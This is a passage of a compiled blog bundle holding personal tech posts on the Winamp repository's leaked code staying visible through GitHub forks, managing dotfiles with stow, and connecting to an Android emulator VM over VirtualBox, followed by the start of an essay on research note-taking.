"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[5894],{6042:e=>{e.exports=JSON.parse('{"blogPosts":[{"id":"winamp-github-repository-problems","metadata":{"permalink":"/blog/winamp-github-repository-problems","source":"@site/blog/2024-10-08winamp-github-repository-problems.md","title":"The Winamp GitHub repository is seriously mismanaged. And there\'s nothing they can do about it now.","description":"The Winamp GitHub repository is seriously mismanaged. And there\'s nothing they can do about it now.","date":"2024-10-08T00:00:00.000Z","formattedDate":"October 8, 2024","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"}],"readingTime":7.32,"hasTruncateMarker":false,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"winamp-github-repository-problems","title":"The Winamp GitHub repository is seriously mismanaged. And there\'s nothing they can do about it now.","description":"The Winamp GitHub repository is seriously mismanaged. And there\'s nothing they can do about it now.","authors":"kiroki","tags":["Cyber Security"]},"nextItem":{"title":"How I manage configuration files on my Linux machine using dotfiles and stow","permalink":"/blog/using-stow-for-managing dotfiles"}},"content":"## Preamble\\n\\nAt this point, I think it\'s no secret that Winamp going \\"open-source\\" has been a bit of a [shit-show](https://www.youtube.com/watch?v=NgZPa78InWw&pp=ygUSd2luYW1wIG9wZW4gc291cmNl).\\n\\nThe initial outrage on the repository was in response to the apparent lack of understanding of what open-source means on the side of Winamp, as they claim that their license is \\"[copyleft](https://www.gnu.org/licenses/copyleft.en.html)\\", while allowing for neither redistribution of modified versions, nor contributions to the official project, and initially not even [allowing forking](https://github.com/WinampDesktop/winamp/commit/64a51755c6f5d85039463c8bf7c2a9e98e862586)! Someone did [point it out](https://github.com/WinampDesktop/winamp/issues/6) to them that they can\'t ban forking on GitHub, as that constitutes [a violation of the TOS](https://docs.github.com/en/site-policy/github-terms/github-terms-of-service#5-license-grant-to-other-users). So, Winamp updated their license to allow forking, but it still doesn\'t allow anything else that would constitute \\"open-source\\" - redistribution or even outside contributions.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2024/10/winamp-allowed-forking.jpg\\" class=\\"kg-image\\" alt loading=\\"lazy\\"/><figcaption>A truly historic moment, ladies and gentlemen :)</figcaption></figure>\\n\\nIn objective terms, this license falls in the category of \\"source-available\\" rather than open-source, and this *is* an important distinction to make. I have no problem with Winamp making their source available as a valuable case-study, but they really shouldn\'t have used the term \\"copyleft\\" if that is the intention.\\n\\nBut we\'re here to discuss more so another glaring issue with the repository, which might actually end up landing a lawsuit at Winamp\'s doors. And sadly, they can\'t really do anything about it anymore.\\n\\n## A rough overview of GitHub\\n\\nIn its simplest form, GitHub can be described as a web-hosted git server for the public. As a developer interested in open-source, you can create a git repository, write some incredible code that you AND your mum are really proud of, and share it with the world on GitHub, so everyone can appreciate your contribution to the democratisation of programming.\\n\\nBut GitHub is more than simply a place to host your git repository. It is also a collaboration platform, where anyone who feels like they _like_ your code, and would like to change it until they **love** it, can \\"fork\\" your repository. Forking is in fact not a more aggressive version of spooning, but simply the act of making a clone of the original repository in your account. This forked repository contains all the history of the original - all the code, and all the commits that came before the fork.\\n\\n## Back to the beauty that is the Winamp GitHub repo\\n\\nIf you were to peruse the code on the Winamp repository in the [first few days](https://github.com/WinampDesktop/winamp/tree/20d28e80a5c861a9d5f449ea911ab75b4f37ad0d) after its publishing, you would have noticed some very intriguing things. For example, a `BuildTools` directory which included things like whole executable files the `7zip`, `git`, and other programs just hanging around, designated as \\"build tools\\". And although very odd indeed, these things seem more so _stupid_ than harmful.\\n\\nBut there\'s much more there! Inside the repo there was proprietary code from Dolby, some questionably SDKs which Winamp may or may-not have the right to redistribute, and entire directory containing the commercial version of Qt, and so on, and so forth.\\n\\n### Winamp did take some action\\n\\nThere are numerous pull requests [deleting said files](https://github.com/WinampDesktop/winamp/pull/1378), and the maintainers [did](https://github.com/WinampDesktop/winamp/commit/16911d12a01f82fea5d851f98e9e702d80f881d5) [also](https://github.com/WinampDesktop/winamp/commit/e721b2e039742c12c1f9c93b1b779ca3b7fc061e) [remove](https://github.com/WinampDesktop/winamp/commit/6ff62b6dda0906648b0a5ce891e85231cbbb40d5) a lot, if not all the unlicensed code. And they did this... in public. You can clearly see many of the commits that delete stuff right there on the [commits page](https://github.com/WinampDesktop/winamp/commits). Which, you know, is a problem. If you open any of the commits listed there, you can simply look at the code that was deleted. If you simply clone that repository locally, you can move around that history and see it at the times before it was removed. This public deletion without rebasing just does nothing.\\n\\n### They deleted some of the commits\\n\\nOK well, if you just scroll around the commits history, you will notice that the commits that delete, for example the Dolby code is nowhere to be found. But in the end, that doesn\'t really do anything either, since you can still just go back in history to [a commit before they deleted it](https://github.com/WinampDesktop/winamp/commit/20d28e80a5c861a9d5f449ea911ab75b4f37ad0d), and just see it there.\\n\\n### Ok, what can they do?\\n\\nI mean, they could just rebase everything, this would theoretically get rid of the commit history. They\'d need to get rid of pull requests as well, since those contain code from certain history positions. And to be honest, at this point I\'d just delete the repo from GitHub, clean up the codebase locally, and create the GitHub repo anew.\\n\\nBut really, even that would not be enough anymore.\\n\\n## A lesser-known \\"feature\\" of GitHub\\n\\nRemember how I said that they deleted some of the commits from their history, so you can\'t simply see what code they removed? Well, even though that commit is gone from the git history, and you wouldn\'t see it even if you cloned the repository locally... you can still see it on GitHub.\\n\\nYou see, to facilitate collaboration through forking, GitHub introduces something called a \\"[repository network](https://docs.github.com/en/repositories/viewing-activity-and-data-for-your-repository/understanding-connections-between-repositories#viewing-a-repositorys-network)\\". This network holds information of the \\"upstream\\" or parent repository, all of its forks, and all the commits that belong to each fork.\\n\\nAdditionally, GitHub caches commits, so that they can be accessed by other repositories in the repository network. [As explained](https://news.ycombinator.com/item?id=41060102) by GitHub themselves, \\"GitHub stores the parent repository along with forks in a \\"repository network\\". It is a known behavior that objects from one network member are readable via other network members. Blobs and commits are stored together, while refs are stored separately for each fork. This shared storage model is what allows for pull requests between members of the same network.\\".\\n\\nSo, not only are the deleted commits potentially visible inside of forks that may have this commit from before it was deleted in the upstream repository. No, they are also just visible in general, as long as you know the commit hash. GitHub simply caches them, and you can just visit the page for that commit, and see all the changes it has made, and the entire code-base at that point in history.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2024/10/github-deleted-commit.jpg\\" class=\\"kg-image\\" alt loading=\\"lazy\\"/><figcaption>You can still see deleted commits on GitHub</figcaption></figure>\\n\\nSo, even if you rebase your repository, the commits history is still there, cached and awaiting. And all forks that were made before the rebase, you can just peruse those anyway.\\n\\nNow, to be fair - GitHub has an entire [docs section](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository#about-sensitive-data-exposure) about leaking sensitive data. It does mention that you can contact support, and request the cached commits to be removed, if they deem that sensitive data has been exposed.\\n\\n### So, what if GitHub clears the cache, and we delete the repo?\\n\\nWell, nothing. It has been already forked more than 2600 thousand times as of the time I\'m writing this. It\'s out there on GitHub :) In the same [docs page](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository#about-sensitive-data-exposure) I linked above, GitHub themselves say that yeah - if someone has forked your repo, you\'re on your own, buddy.\\n\\nIf you remove the upstream repository of a repository network, GitHub simply [designates another fork](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/what-happens-to-forks-when-a-repository-is-deleted-or-changes-visibility#deleting-a-public-repository) to be the upstream one. And all of that history and cached commits are still accessible through any of the forked repositories.\\n\\n## Conclusion\\n\\nI do find it ironic, that this same collaborative feature which Winamp tried to disallow us from using - forking their repo, is also the one which in the end will not allow them to ever escape the reality that they managed to leak some confidential data on their repository.\\n\\nBut hey, what\'s done is done, and it did allow me to learn more about how GitHub works with its repository networks and whatnot, so I guess it is possible to learn from someone else\'s mistakes. I hope you learned something from this too, at the very least to be very careful with what you push to GitHub. And if you do make a mistake - just delete the repo before it was forked, and try again. QED\\n\\nIn terms of the Winamp repository, I am happy that they decided to share their codebase. Even though you literally can\'t do anything with it apart from reading it, it\'s still a nice case-study. And I do not wish for them to regret going source-available, so I hope they don\'t get any legal problems.\\n\\nBut on the other hand, I do wish they\'d gone fully open-source. I mean, what are they protecting right now? Winamp is a big part of history, everyone has at least heard of it, if not used it. But nowadays it\'s just that - part of history. But we\'ve seen that through collaboration and openness of the developers, a lot of software can live for a very long time. Winamp could become something modern and fully maintained, if it allowed for outside contribution. I do hope they take that next step at some point. After they clean up this mess of a repo..."},{"id":"using-stow-for-managing dotfiles","metadata":{"permalink":"/blog/using-stow-for-managing dotfiles","source":"@site/blog/2024-10-06using-stow-for-managing-dotfiles.md","title":"How I manage configuration files on my Linux machine using dotfiles and stow","description":"Maintaining your dotfiles can be actually really simple, once you set it up in a good way. After a few attempts, I landed on stow, and I ain\'t going back!","date":"2024-10-06T00:00:00.000Z","formattedDate":"October 6, 2024","tags":[{"label":"Coding","permalink":"/blog/tags/coding"},{"label":"Configuration","permalink":"/blog/tags/configuration"},{"label":"Productivity","permalink":"/blog/tags/productivity"},{"label":"Linux","permalink":"/blog/tags/linux"}],"readingTime":6.98,"hasTruncateMarker":false,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"using-stow-for-managing dotfiles","title":"How I manage configuration files on my Linux machine using dotfiles and stow","description":"Maintaining your dotfiles can be actually really simple, once you set it up in a good way. After a few attempts, I landed on stow, and I ain\'t going back!","authors":"kiroki","tags":["Coding","Configuration","Productivity","Linux"]},"prevItem":{"title":"The Winamp GitHub repository is seriously mismanaged. And there\'s nothing they can do about it now.","permalink":"/blog/winamp-github-repository-problems"},"nextItem":{"title":"How to connect to an Android Emulator from VirtualBox","permalink":"/blog/developing-on-android-emulator-from-virtualbox"}},"content":"## Motivation\\n\\nI\'ve been trying to maintain a _dotfiles_ repository for a few years now. There, I keep configurations for all kinds of different tools and applications I keep on my development machines. It\'s great for maintainability and versioning, but maintaining and keeping the _dotfiles_ up to date can be a tedious task. But I\'ve quite accidentally found a good and easy way to do it!\\n\\nThe three major options I\'ve considered are:\\n- Setting up a home directory as a `--bare` git repository.\\n- [Symlinking](https://en.wikipedia.org/wiki/Symbolic_link) every configuration manually\\n- [_Stow_](https://linux.die.net/man/8/stow)\\n\\nThe first option of the runt, is of course - from a storytelling point, the first one to discard.\\n\\nSetting up your entire home directory as a repository, you have to be careful with exactly what to track, and what not. Basically, you\'d need a `.gitignore` file that you\'d have to constantly update with everything _but_ the things you want to keep track of. It\'s very prone to accidentally adding something you don\'t want tracked, and forgetting to include it in the `.gitignore`. Plus, a giant git repo in my home directory isn\'t really to my taste.\\n\\nManual symlinking does solve those problems, but it can be quite complicated to automate and keep track of. _Stow_ is an abstraction on top of symlinks, that allows us to automate symlink management, and turn it into _package management_. Let\'s see how to set up your _dotfiles_ repo, in order to make use of _stow_.\\n\\n## Setup\\n\\nBefore using _stow_, my config files were laid out in a very simple way. Basically, everything that was in the `$HOME/.config/` directory, was just copied into `$HOME/code/dotfiles/.config/`. Other configs that were just files or directories inside the `$HOME` directory, I just copied into the repo root `$HOME/code/dotfiles/` - for example from `$HOME/.bashrc` to `$HOME/code/dotfiles/.bashrc`.\\n\\n```code title=\\"~/code/dotfiles\\"\\n.\\n|-- .bashrc\\n|-- .config\\n|   |-- gtk-3.0\\n|   |   `-- [... files]\\n|   |-- i3\\n|   |   `-- [... files]\\n|   |-- nvim\\n|   |   |-- after\\n|   |   |   |-- ftplugin\\n|   |   |   |   `-- [... files]\\n|   |   |   `-- plugin\\n|   |   |       `-- [... files]\\n|   |   |-- init.lua\\n|   |   |-- lua\\n|   |   |   `-- kiroki\\n|   |   |       `-- [... files]\\n|   |   `-- plugin\\n|   |       `-- [... files]\\n|   `-- terminator\\n|       `-- [... files]\\n|-- i3blocks\\n|   `-- [... files]\\n`-- .local\\n    `-- share\\n        `-- fonts\\n            `-- [... files]\\n```\\n\\n### How _stow_ likes it\\n\\n_Stow_ works more like (or exactly like) a package manager. We have to think of each configuration we manage as a package. So, instead of having a bunch of configurations under the `.config` directory, like `$HOME/code/dotfiles/.config/i3` and `$HOME/code/dotfiles/.config/nvim`, we can split these into separate directories, in this example `$HOME/code/dotfiles/i3/.config/i3` and `$HOME/code/dotfiles/nvim/.config/nvim`.\\n\\nWe can name them however though, so it could be `$HOME/code/dotfiles/foo/.config/i3` for our i3 config.\\n\\nAnd technically, if we want to be not-so-clever, we can just do something like `$HOME/code/dotfiles/my-dot-config-directory/.config/<everything like i3 and nvim>`. But the power of _stow_ is that we can stow and unstow each config like a package. This technically means, that we can also version our configs. For example, we could have one version of i3 for Arch under `$HOME/code/dotfiles/i3-arch/.config/i3`, and one for Ubuntu under `$HOME/code/dotfiles/i3-ubuntu/.config/i3`. Because of these reasons, I recommend this package structure.\\n\\nFor another example, the `.bashrc` file is typically right in the `$HOME` directory, so we can \\"package\\" it simply as `$HOME/code/dotfiles/bash/.bashrc`. I know, I know - who uses bash anymore... well, I do apparently :)\\n\\n:::tip\\n_Stow_ is technically a *package manager*. To make full use of it, we can turn _every_ configuration we contain in our _dotfiles_ into a package, by placing it in its own directory.\\n:::\\n\\n### How it is now\\n\\nAfter we migrate to using _stow_, our repo structure now looks like this:\\n\\n```code title=\\"~/code/dotfiles\\"\\n.\\n|-- bash\\n|   `-- .bashrc\\n|-- fonts\\n|   `-- .local\\n|       `-- share\\n|           `-- fonts\\n|               `-- [... files]\\n|-- gtk-3.0\\n|   `-- .config\\n|       `-- gtk-3.0\\n|           `-- [... files]\\n|-- i3\\n|   `-- .config\\n|       `-- i3\\n|           `-- [... files]\\n|-- i3blocks\\n|   `-- i3blocks\\n|       `-- [... files]\\n|-- nvim\\n|   `-- .config\\n|       `-- nvim\\n|           |-- after\\n|           |   |-- ftplugin\\n|           |   |   `-- [... files]\\n|           |   `-- plugin\\n|           |       `-- [... files]\\n|           |-- init.lua\\n|           |-- lua\\n|           |   `-- kiroki\\n|           |       `-- [... files]\\n|           `-- plugin\\n|               `-- [... files]\\n|-- stow_config.sh\\n`-- terminator\\n    `-- .config\\n        `-- terminator\\n            `-- [... files]\\n\\n```\\n\\n## Usage\\n\\n### Stowing\\n\\nWell, great. So far, we\'ve basically just moved some directories around. So, what now?\\n\\nWell, now we can just run _stow_ for each of these newly created packages. The way that _stow_ works, is that it takes the directory inside of the \\"package\\" directory, and creates a symlink to it in the parent of the current working directory.\\n\\nSo, for example, if we now _cd_ into `$HOME/code/dotfiles/`, we can run `stow i3`. What this will do is, it will create a symlink to `$HOME/code/dotfiles/i3/.config/i3` in `$HOME/code/.config/`. That will look something like this:\\n\\n```bash\\nlrwxrwxrwx  1 kblagoev kblagoev   30 Oct  6 23:14 i3 -> ../code/dotfiles/i3/.config/i3/\\n```\\n\\n\\"But wait!\\", I hear you say. \\"Isn\'t this `i3` directory, or symlink, or whatever, supposed to be in our `$HOME` directory? What is it doing in `$HOME/code/`?\\".\\n\\nYou\'re absolutely right. Let\'s fix this. _Stow_ has a flag `-t`, or `--target`, with which we can specify the root of the package management. This target is by default the parent of the _pwd_, and that\'s why by running _stow_ inside of `$HOME/code/dotfiles/`, the symlinking occurred under `$HOME/code/` (and resulted in our symlink being `$HOME/code/.config/i3`. It can be a bit confusing to keep track of this, but yeah). So, instead, we want to target the `$HOME` directory. That\'s why we should run `stow -t $HOME i3` instead.\\n\\n:::tip\\nIf we don\'t place our _dotfiles_ repository in the `$HOME` directory, we have to target it when we use _stow_ by utilising the `-t` flag, e.g. `stow -t $HOME i3`.\\n:::\\n\\n### Unstowing\\n\\nRemoving a config is super simple with _stow_ as well. Following our example with i3, we can simply run `stow -D -t $HOME i3`. The `-D` flag deletes the symlink, and our config is gone from the `$HOME/.config/` directory. And only that config!\\n\\n## Additional note on Usage\\n\\nThere is a flag `--dotfiles`, which allows to rename hidden directories, such as `.whatever-the-name-is` to `dot-whatever-the-name-is`, and for them to be pre-processed by _stow_ by replacing `dot-` with `.`. This is useful, so there aren\'t hidden files and directories in the repo. Quite useful for easier searching that respects hidden files.\\n\\nThis is great and all, but in the latest version of _stow_ on Ubuntu there\'s a bug with that. The bug is fixed in the newest release of _stow_, but I will wait for it to get updated in _apt_, before migrating to that setting - just for availability reasons.\\n\\nBut if you\'re going to install the latest version of _stow_, do keep that option in your mind. It\'s pretty neat.\\n\\nAnd lastly, for my own convenience, I\'ve written a bash script which can stow and unstow all the packages inside my repo with one command. I\'ve opted into having a manually updated list of the packages, just because I keep some other junk in the _dotfiles_ repo, but this can be changed. I will paste the script here, if you\'d like to use it yourself (or a modified version of it).\\n\\n```bash title=\\"stow_config.sh\\"\\n#!/bin/bash\\n\\n# Define an array of package names\\npackages=(\\n  \\"bash\\"\\n  \\"gtk-3.0\\"\\n  \\"i3\\"\\n  \\"i3blocks\\"\\n  \\"terminator\\"\\n  \\"nvim\\"\\n  \\"fonts\\"\\n)\\n\\n# Check if the first argument is \\"remove\\" to use the -D flag\\nstow_flag=\\"-t\\"\\nif [ \\"$1\\" == \\"remove\\" ]; then\\n  stow_flag=\\"-D -t\\"\\nfi\\n\\n# Loop through each package and run stow or unstow with -D\\nfor package in \\"${packages[@]}\\"; do\\n  if [ \\"$1\\" == \\"remove\\" ]; then\\n    echo \\"Unstowing $package...\\"\\n  else\\n    echo \\"Stowing $package...\\"\\n  fi\\n\\n  stow $stow_flag \\"$HOME\\" \\"$package\\"\\n\\n  if [ $? -eq 0 ]; then\\n    if [ \\"$1\\" == \\"remove\\" ]; then\\n      echo \\"$package unstowed successfully.\\"\\n    else\\n      echo \\"$package stowed successfully.\\"\\n    fi\\n  else\\n    if [ \\"$1\\" == \\"remove\\" ]; then\\n      echo \\"Error unstowing $package.\\"\\n    else\\n      echo \\"Error stowing $package.\\"\\n    fi\\n  fi\\ndone\\n\\necho \\"All done!\\"\\n\\n\\n```\\n\\nRunning `./stow_config.sh` will stow, and running `./stow_config.sh remove` will unstow the listed packages.\\n\\nThat\'s it! glhf"},{"id":"developing-on-android-emulator-from-virtualbox","metadata":{"permalink":"/blog/developing-on-android-emulator-from-virtualbox","source":"@site/blog/2023-02-24developing-on-android-emulator-from-virtualbox.md","title":"How to connect to an Android Emulator from VirtualBox","description":"Developing from a VM is great, but there\'s a problem when you have to run an emulator inside of it. My solution is to have two separate virtual machines running in VirtualBox on the host OS, and let them communicate using networking.","date":"2023-02-24T00:00:00.000Z","formattedDate":"February 24, 2023","tags":[{"label":"Coding","permalink":"/blog/tags/coding"},{"label":"Programming","permalink":"/blog/tags/programming"},{"label":"VMs","permalink":"/blog/tags/v-ms"},{"label":"Android","permalink":"/blog/tags/android"}],"readingTime":4.51,"hasTruncateMarker":false,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"developing-on-android-emulator-from-virtualbox","title":"How to connect to an Android Emulator from VirtualBox","description":"Developing from a VM is great, but there\'s a problem when you have to run an emulator inside of it. My solution is to have two separate virtual machines running in VirtualBox on the host OS, and let them communicate using networking.","authors":"kiroki","tags":["Coding","Programming","VMs","Android"]},"prevItem":{"title":"How I manage configuration files on my Linux machine using dotfiles and stow","permalink":"/blog/using-stow-for-managing dotfiles"},"nextItem":{"title":"How to remember what I was reading about?","permalink":"/blog/how-to-remember-what-i-was-reading-about"}},"content":"## Motivation\\n\\nIf you\'re like me, you try and keep all of your coding-based clutter on a virtual machine. Which usually works great. You can maintain a clean OS, separate work from pleasure, and quickly return to a snapshot if something goes terribly wrong. But when I tried doing development for Android from a virtual machine, I quickly arrived at an unexpected hurdle.\\n\\nIf you try and run [Android Studio](https://developer.android.com/studio)\'s emulators, you\'ll quickly be reminded that you can\'t simply run a virtual machine inside a virtual machine. You technically can, if you enable _Nested VT-x/AMD-V_, but even if you succeed navigating the hell of starting an AVD android emulator from inside your VM, you\'d be met by the huge performance hit of running nested virtualisation.\\n\\nYou can instead consider running either the [Genymotion emulator](https://www.genymotion.com/) or [Xamarin Android Player](https://xamarin.com/android-player), which both use Oracle\'s [VirtualBox](https://www.virtualbox.org/) to run their emulators. But instead of running them inside your VM (and being met with the issue of nested virtualisation), you can run these emulators on your host OS. Since both of these use VirtualBox, **you can take full use of the networking aspect of VMs to connect your development VM to your Android emulator VM!**\\n\\n:::note\\nHence, my solution is to have two separate virtual machines running in VirtualBox on the host OS, and let them communicate using networking.\\n:::\\n\\n## Setup\\n\\nI\'m assuming you\'ve already \\n1. Downloaded and installed VirtualBox\\n2. Set up a development VM inside of VirtualBox\\n3. Connected your dev VM to the outside world using either _NAT_ or **Bridged** networking (I personally use bridged, since it helps me to easier access any web dev instances running in the VM)\\n\\n### Creating a virtual device\\n\\nAlrighty, now we can download and install either [Genymotion emulator](https://www.genymotion.com/) or [Xamarin Android Player](https://xamarin.com/android-player) on your host OS.\\n\\nAfter you\'ve done that, you can start up your software, and set up a virtual device (phone) by following the instructions.\\n\\n![created virtual device](/content/images/2023/02/genymotion-devices.png)\\n\\nNow we need to do some configuration work inside VirtualBox.\\n\\n### Configuring the virtual mobile device\\n\\nIf you open up VirtualBox, you\'ll see that the newly created virtual mobile device is listed in the list of machines.\\n\\n![list virtual devices](/content/images/2023/02/virtualbox-list.png)\\n\\nWe need to edit the network settings for the mobile device. It will need two adapters. One is to connect to the network of the development machine (NAT or Bridged). In my case the machines are in a bridged network, which makes it easier to access from the host OS, as well as between each-other.\\n\\n:::tip\\nFor some development platforms like React-Native, it\'s important that both the dev machine and mobile device are on the same network to allow easy debugging.\\n:::\\n\\n![mobile bridged adapter](/content/images/2023/02/virtualbox-network-1.png)\\n\\nThe other, arguably more important adapter to add/enable is the **Host-only Adapter**. This is the one [adb](https://developer.android.com/studio/command-line/adb) will connect over.\\n\\n![mobile host-only adapter](/content/images/2023/02/virtualbox-network-2.png)\\n\\n**Make note of the adapter _name_ here!**\\n\\nVirtualBox has the habit of creating multiple host-only adapters, so this name is very important to make note of.\\n\\n### Configuring the development VM\\n\\nNow that we have set the mobile device settings up, we need to mirror them in the develpment VM. If you\'ve used NAT for the mobile device, redo the settings in the development one. If you\'ve put it into a bridged network, do the same to the dev VM.\\n\\nAfter this, we need to add a _Host-only Adapter_ to the dev VM. Did you take note of the Adapter name from the mobile machine? This is where you use it!\\n\\n![dev machine host-only adapter](/content/images/2023/02/virtualbox-network-3.png)\\n\\n### Starting up the machines\\n\\nNormally, you just start them from their respective applications. Start the mobile machine from Xamarin or Genymotion, and start your dev VM from VirtualBox.\\n\\nBut I\'ve found that if I start the mobile machine from Genymotion, it tends to reset the Host-only Adapter name, add a new one, and fail to start. So, if this happens to you, this is what I do:\\n\\n1. Start the mobile machine from VirtualBox. A command-line terminal will pop up, and will start loading.\\n2. When it appears that the terminal isn\'t doing anything anymore, you can safely start the mobile device from Genymotion.\\n\\n![mobile device ready to be started from genymotion](/content/images/2023/02/genymotion-starting.png)\\n\\nThis is how my terminal looks when it stops loading. At this stage, I start the device from Genymotion as normal.\\n\\nIf you haven\'t already, you can now start your development VM as well.\\n\\n### Connecting to the mobile device\\n\\nIn this scenario, we are going to use `adb` to connect to the mobile device from the dev VM. All we need is the IP that the device is running on. Both Genymotion and Xamarin provide some way to see the IP.\\n\\n![genymotion shows ip](/content/images/2023/02/adb-ip-1.png)\\n\\nBut if you\'re having trouble to find it, you can go to VirtualBox, and see the IP from the terminal we saw earlier.\\n\\n![virtualbox shows ip](/content/images/2023/02/adb-ip-2.png)\\n\\nSo, now we can easily connect from our dev VM using the command-line tool `adb`\\n\\n```bash\\nkblagoev@deva:~/Android/Sdk/platform-tools$ ./adb connect 192.168.68.101\\n* daemon not running; starting now at tcp:5037\\n* daemon started successfully\\nconnected to 192.168.68.101:5555\\nkblagoev@deva:~/Android/Sdk/platform-tools$ \\n```\\n\\n## Success!\\n\\nAnd since I\'ve used a bridged network, I can also easily do network connections between the two devices, which can be quite useful in some cases. So I recommend it, unless you have your own way of doing it.\\n\\nNow you can develop! Have fun!\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"how-to-remember-what-i-was-reading-about","metadata":{"permalink":"/blog/how-to-remember-what-i-was-reading-about","source":"@site/blog/2022-11-01-22:15:58how-to-remember-what-i-was-reading-about.md","title":"How to remember what I was reading about?","description":"Reading is an integral part of writing.","date":"2022-11-01T00:00:00.000Z","formattedDate":"November 1, 2022","tags":[{"label":"Getting Started","permalink":"/blog/tags/getting-started"},{"label":"Knowledge Management","permalink":"/blog/tags/knowledge-management"},{"label":"Research","permalink":"/blog/tags/research"},{"label":"Backlinks","permalink":"/blog/tags/backlinks"},{"label":"Search Engines","permalink":"/blog/tags/search-engines"},{"label":"Creativity","permalink":"/blog/tags/creativity"}],"readingTime":6.665,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"how-to-remember-what-i-was-reading-about","title":"How to remember what I was reading about?","authors":"kiroki","tags":["Getting Started","Knowledge Management","Research","Backlinks","Search Engines","Creativity"]},"prevItem":{"title":"How to connect to an Android Emulator from VirtualBox","permalink":"/blog/developing-on-android-emulator-from-virtualbox"},"nextItem":{"title":"Key Mission - Cyberapocalypse 2021 CTF","permalink":"/blog/key-mission-cyberapocalypse-2021-ctf"}},"content":"> Reading is an integral part of writing.\\n\\nThere are many ways this statement can be phrased, but it carries the message accross. Before creating something new and original, we need to have information in the context of the thing we\'re trying to create.\\n\\n\x3c!-- truncate --\x3e\\n\\nAnd all of that starts with research.\\n\\n> When I start researching a subject, I begin by googling something, which then turns into dozens of open tabs in the browser.\\n\\n> I\'m too afraid to close any of the tabs, lest I forget something.\\n\\n> When I look at information I\'ve stored, I no longer remember why I thought this was important, or how it connects to what I was searching for.\\n\\nDo these sound familiar to you? I can\'t imagine I\'m the only one facing these problems.\\n\\n## Creating a linear output out of non-linear input\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2022/11/Notes_221101_230951_e4f.jpg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"1620\\" height=\\"1200\\" srcset=\\"/content/images/size/w600/2022/11/Notes_221101_230951_e4f.jpg 600w, /content/images/size/w1000/2022/11/Notes_221101_230951_e4f.jpg 1000w, /content/images/size/w1600/2022/11/Notes_221101_230951_e4f.jpg 1600w, /content/images/2022/11/Notes_221101_230951_e4f.jpg 1620w\\" sizes=\\"(min-width: 720px) 720px\\"/><figcaption>Knowledge management lifecycle. This particular version separates between exploration and collection, which I find useful.</figcaption></figure>\\n\\nThe thing that allowed me to think about the importance of contextualising knowledge, is the discovery of the knowledge management lifecycle. I\'ve since seen many different versions of this thing, but the one that resonated with me was the following:\\n\\nexploration -> collection -> contemplation -> creation -> sharing.\\n\\nThe reason this particular scheme spoke to me, was the distinction between  _exploration_ and _collection_. In a typical for me scenario, when I set out to learn about something, I start by searching on Google, trying to get into a rabbit hole of knowledge gathering. This is the exploration phase of the above. But try and imagine how you jump from exploration to the thinking phase - contemplation.\\n\\nAfter a successful search hunt, you now have let\'s say 20 tabs open in your browser. Some of them barely touch on the subject matter of interest, some of them have golden nuggets in there, and some you thought you\'d read into later. Then a day passes, with the browser open, and you already don\'t remember what you wanted to read or take note of. And your \\"collection\\" is so ephemeral, that any closed tab could remove context from 10 other tabs. Imagine now that you have to stop thinking about this particular subject for a week, or longer...\\n\\nIn reality, we\'ve touched upon the subject of non-linearity of the creation process. The process of creation is that of connecting preexisting information into a coherent, mostly linear output, with the occasional sidenote. But the information you\'re working with is itself messy: a complicated graph of intertwining lines connecting dots in your brain. It\'s multidimensional and non-linear.\\n\\nAnd the exploration, collection, and even creation phase of the lifecycle are depicting exactly this phase of non-linearity of the process.\\n\\nBut moreover, your brain is not as good at remembering as a computer harddrive is.\\n\\n## Tracing the discovery context\\n\\n_\\"Well, obviously the solution to all of this is note-taking\\"_, I hear you say at the back of my head. And in a sense, you\'re right. But what would you write in those notes? Are your notes going to be any different from saving all of your open tabs in a folder in Notion? What happens when in a month you open up your Notion, and go to the folder consisting of 30 URLs. Do you still remember what was what in there? I definitely don\'t, but if you do, all the power to you.\\n\\nThis is where I started thinking of knowledge laid out in a graph in front of me, a map if you will. This is definitely not a unique idea, and some note-taking apps like Obsidian and RoamResearch already allow you to do this in certain ways. This is the idea of interconnecting different nuggets of information by linking between them - in a forwards and backwards direction.\\n\\nAnd the backward direction is the crux of the problem. Opening 30 tabs in your browser, or saving 30 URLs in a text file, doesn\'t have one thing in particular - backlinks. Compiling a list of articles is not self-referential by design. It\'s a divergent thought process, or at best a linear read.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2022/11/Notes_221101_232511_434-1.jpg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"1728\\" height=\\"1200\\" srcset=\\"/content/images/size/w600/2022/11/Notes_221101_232511_434-1.jpg 600w, /content/images/size/w1000/2022/11/Notes_221101_232511_434-1.jpg 1000w, /content/images/size/w1600/2022/11/Notes_221101_232511_434-1.jpg 1600w, /content/images/2022/11/Notes_221101_232511_434-1.jpg 1728w\\" sizes=\\"(min-width: 720px) 720px\\"/><figcaption>Research is non-linear, and includes a lot of divergent paths. Finding how it all relates to the core subject is at the heart of creation. Tracing and storing the context of explored information is a solution to remembering relevant information when it\'s needed.</figcaption></figure>\\n\\nLet me give you a thought experiment. Have you even been on Wikipedia? A typical exploration phase on Wikipedia goes as follows - you search for an article on it, and 